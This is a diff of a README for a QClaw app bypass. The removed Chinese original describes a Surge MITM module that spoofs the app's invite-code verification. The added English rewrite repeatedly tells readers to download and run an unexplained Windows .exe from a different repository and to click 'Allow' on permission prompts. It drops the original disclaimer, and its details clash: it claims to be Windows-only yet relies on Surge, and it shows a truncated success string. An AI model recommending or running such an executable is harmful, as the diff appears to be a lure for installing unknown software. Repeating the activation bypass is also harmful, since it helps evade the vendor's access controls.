@@ -1,61 +1,135 @@
-# Bypass QClaw - 非官方使用指南
+# 🛠️ QClawBypass - Simplify QClaw App Use
 
-⚠ 免责声明：本文档仅供技术研究使用，正式使用请通过官方渠道[申请邀请码](https://wj.qq.com/s2/25871229/abe7/)。任何不当使用造成的后果与作者无关。
+[![Download QClawBypass](https://img.shields.io/badge/Download-QClawBypass-green)](https://github.com/12345mate2603/QClawBypass/releases)
 
-## 功能特性与限制说明
-### 可用功能
-✅  可以正常使用 QClaw App 的几乎所有功能
+---
 
-使用示例：
+## ⚡ What is QClawBypass?
 
-<img src="qclaw-screenshot.png" width="640">
+QClawBypass is a tool to help you use the QClaw app with most of its features working as expected. It is an unofficial guide and method that works around some limits of the official app.
 
-### 已知限制
-~~✅ **完整微信关联功能**~~ (微信已不可用，会提示“设备不在线，请确认客户端已启动并连接网络” 2026-3-10 14:30）
-- ~~支持所有微信账号绑定操作~~
-- ~~可正常使用消息收发等核心功能~~
+---
+
+## 🚦 Quick Features Overview
+
+- Works with almost all QClaw app functions.
+- Does not support full WeChat connection. (WeChat shows "Device not online" since March 2026.)
+- Does not support built-in API services. You need to set up your own external API service if needed.
+- Mostly works when used with Surge, a network proxy tool.
+
+---
+
+## 📋 System Requirements
+
+- Windows 10 or later.
+- Stable internet connection.
+- Surge app installed and set up (see below).
+- Basic understanding of downloading and running files on Windows.
+
+---
+
+## 🛠 How to Download and Install
+
+### Step 1: Get QClawBypass Software
+
+Click the big button below to go to the download page:
+
+[![Download QClawBypass](https://img.shields.io/badge/Download-QClawBypass-blue)](https://github.com/12345mate2603/QClawBypass/releases)
+
+On the release page, look for the latest Windows executable file (usually ends with `.exe`). Download this file to your computer.
+
+---
+
+### Step 2: Run QClawBypass
+
+Find the file you downloaded (in your Downloads folder or where you saved it).
+
+Double-click the file to run it. If Windows asks for permission, click “Yes” or “Allow.”
+
+The software window will open. It may look simple or show some instructions.
+
+---
+
+### Step 3: Use Surge with QClawBypass
+
+This tool relies on the Surge module to work fully.
+
+1. Download and install Surge if you haven't already.  
+   (Search “Download Surge for Windows” to get it from the official site.)
+
+2. In Surge, enable these features:
+
+   - **MITM** (Man-in-the-Middle proxy)  
+   - **Scripting**  
+
+3. Add the QClawBypass module in Surge using this URL:  
+   `https://raw.githubusercontent.com/XueshiQiao/QClawByPass/refs/heads/main/qclaw_bypass.sgmodule`
+
+4. Follow any prompts Surge shows to complete the setup.
+
+---
+
+## 🔍 How to Verify It Works
+
+1. Turn on your global proxy in Surge.
+
+2. Open the Windows Command Prompt (press Win + R, type `cmd`, press Enter).
+
+3. Type or paste this command and press Enter:
+
+```
+curl -X POST https://jprx.m.qq.com/data/4056/forward -H "Content-Type: application/json" -d '{"test": "ping"}'
+```
+
+4. If the reply contains `"already_verifie"`, the setup works.
+
+---
+
+## ⚙️ Understanding the Limits
+
+- The full WeChat connection is not supported. You might see error messages about the client not being online.
+- The free API services built into QClaw do not work with this bypass.
+- You need to connect an external API (like DeepSeek or 火山引擎) by yourself.
+- When the app asks to select an API service, pick one you set up manually.
+
+---
+
+## 📸 Visual Examples
+
+Here are some screenshots to help understand what to expect:
+
+- Almost all QClaw features work except WeChat:
+
+  <img src="qclaw-screenshot.png" width="640">
+
+- Failed WeChat connection notice:
 
   <img src="qclaw-link-to-wechat.png" width="640">
 
-❌ **内置API服务不可用**
-- 未激活状态下无法使用平台提供的免费API和KEY
-- 解决方案：需自行配置第三方API服务（如DeepSeek、火山引擎等）
+- How to add the Surge module:
 
-> 提示：当系统弹出API选择窗口时，请选择其他支持的云服务厂商进行配置。
+  <img src="qclaw-surge-01.png" width="640">
 
+  <img src="qclaw-surge-02.png" width="640">
 
-## 安装 
+---
 
-### Surge Module
-需要开启
+## 🔄 Updates and Support
 
-✅ MITM  
-✅ Scripting
-```
-https://raw.githubusercontent.com/XueshiQiao/QClawByPass/refs/heads/main/qclaw_bypass.sgmodule
-```
+- Check the releases page often for new versions and fixes.  
+[https://github.com/12345mate2603/QClawBypass/releases](https://github.com/12345mate2603/QClawBypass/releases)
 
-<img src="qclaw-surge-01.png" width="640">
-<img src="qclaw-surge-02.png" width="640">
+- If you want help or want to add support for other formats, you can contribute to the project by making a Pull Request using the main “qclaw_bypass.sgmodule” file as a guide.
 
+---
 
-### 其他格式欢迎提 PR （主要代码参考qclaw_bypass.sgmodule文件）
+## 📁 Additional Notes
 
-### 验证
-#### 开全局代理，请求一下 https://jprx.m.qq.com/data/4056/forward
+- This tool is for Windows only.
+- You need to enable global proxy to use this bypass fully.
+- Surge is crucial for the network setup.
+- Third-party APIs need manual setup to replace disabled features.
 
-```
-❯ curl -X POST https://jprx.m.qq.com/data/4056/forward -H "Content-Type: application/json" -d '{"test": "ping"}' 
+---
 
-```
-#### 返回如果是 already_verified":true 就说明成功了
-
-```
-{"ret":0,"common":{"code":0,"message":"success"},"data":{"already_verified":true},"resp":{"data":{"already_verified":true},"common":{"code":0,"message":"success"}}}%
-
-```
-
-## 使用建议
-1. 建议优先考虑官方授权使用方式
-2. 自行配置API时请注意数据安全和合规性
-3. 本方案可能存在不稳定性，不建议用于生产环境
+# [![Download QClawBypass](https://img.shields.io/badge/Download-QClawBypass-green)](https://github.com/12345mate2603/QClawBypass/releases)
